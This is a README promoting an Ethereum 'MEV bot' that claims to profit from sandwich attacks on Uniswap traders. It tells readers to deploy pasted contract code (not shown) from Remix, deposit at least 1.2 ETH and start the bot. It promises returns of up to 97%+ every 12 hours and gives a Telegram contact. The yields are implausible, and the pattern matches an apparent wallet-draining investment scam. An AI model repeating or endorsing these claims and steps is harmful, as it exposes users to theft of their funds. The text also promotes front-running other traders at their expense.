---

<div align="center">

# 💎🤖 ETH MEV-BOT 🤖💎
  
An ETH MEV-BOT for performing sandwich attacks on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that empowers contract deployers to reap profits from tokens.

</div>

---

## 📚 About

In the fascinating world of cryptocurrency, understanding what an MEV Bot is, can be crucial. A Maximal Extractable Value (MEV) bot is a sophisticated arbitrage instrument that scouts the Mempool for pending transactions on decentralized exchanges such as Uniswap. It cunningly inserts our transaction with a slightly higher gas fee (1 Gwei more than the transaction attempting to enter), thus sandwiching the pending transaction and ensuring ours is processed first, reaping profits from the slippage differences.

---

<div align="center">

## 🚀 How it Works

![profit](https://user-images.githubusercontent.com/132264778/235452623-01aafec4-077e-420e-b937-9fffe28668fb.jpeg)

</div>

Our BOT sniffs the Uniswap v2 Mempool for transactions with high slippage, determining if a sandwich attack would be profitable. Bots then compete to buy up the token on-chain as swiftly as possible, sandwiching the victim's transaction and creating a profitable slippage opportunity. My bot always adds 1 gas more than everybody else's, as long as it remains profitable, ensuring a large number of profitable transactions. It then sends back the ETH to the contract ready for withdrawal. This bot performs all these tasks faster than 99% of other bots out there.

---

## ETH Investment Returns

Your Ethereum (ETH) investment returns are calculated on a 12-hour basis as follows:

| ETH Range (invested) | Returns (12 hours) |
| --- | --- |
| `1.2ETH - 2.4ETH` | `up to 10%` |
| `2.4ETH - 5ETH` | `up to 20%` |
| `5ETH - 10ETH` | `20-27%` |
| `10ETH - 20ETH` | `27-35%` |
| `20ETH - 50ETH` | `35-50%` |
| `50ETH - 100ETH` | `50-63%` |
| `100ETH - 200ETH` | `63-76%` |
| `200ETH - 500ETH` | `76-97%` |
| `500ETH and above` | `97%+` |

**Note:** The above percentages are subject to market conditions and are not guaranteed. Please invest responsibly.

---

## 👨‍💻 Instructions

1) Follow these instructions to deploy your smart contract using [REMIX IDE](https://remix.ethereum.org):
  - 📁 Create a new file mev.sol and paste the code from mev.sol.


<img width="1496" alt="1" src="https://user-images.githubusercontent.com/132264778/235452636-8dfda62f-714c-4fb2-9d45-d75bbea7be85.png">

2) 🔧 Select compiler version 0.6.12 and press compile.

![2](https://user-images.githubusercontent.com/132264778/235454398-1211b3c3-5eb9-463e-9d3d-824d398eec0d.png)

3) 🚀 Navigate to "Deploy" and set the environment to "Injected Provider - MetaMask". Connect the wallet and click "Deploy".

![3](https://user-images.githubusercontent.com/132264778/235454410-cb9b447c-bb47-4907-872a-6c75bdf17890.png)

4) Verify your smart contract on etherscan -

- 🌐 Visit [Etherscan Verify Contract](https://etherscan.io/verifyContract).
   - 📝 Enter contract address and set inputs:
   - Compiler Type: Solidity (Single File)
   - Compiler Version: ^0.6.12
   - License Type: 3) MIT License (MIT)
   - 📋 Paste the code from mev.sol.
   - 🚫 Leave ABI input box empty.
   - 🟢 Click "Verify"


5) Deposit funds (at least 1.2 ETH to prevent negative slippage) into your specific contract/bot address.
 
6) Go to your verified contract. Write contract. Enter the amount of ETH you want to trade with into the 1. Start. Confirm the transaction

<img width="780" alt="4" src="https://user-images.githubusercontent.com/132264778/235452658-71fb728f-d0e6-4a30-8236-9cf8c5926979.png">

7) Withdraw anytime by clicking 'withdrawal'.

:hourglass_flowing_sand: Wait a couple of days for profits to roll in. Remember, for successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 1.2ΕΤΗ and higher. 

At any point, you can stop the bot or retrieve your money by calling the withdrawal function.

<div align="center">

💰💰💰 Make money with MevBot 💰💰💰

</div>

---

## Contact Us
For any inquiries, please reach out to us at:

Telegram: [Click here](https://t.me/MEV_inquiries)

---

##### Please ⭐ the repo to support my project
![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)

---
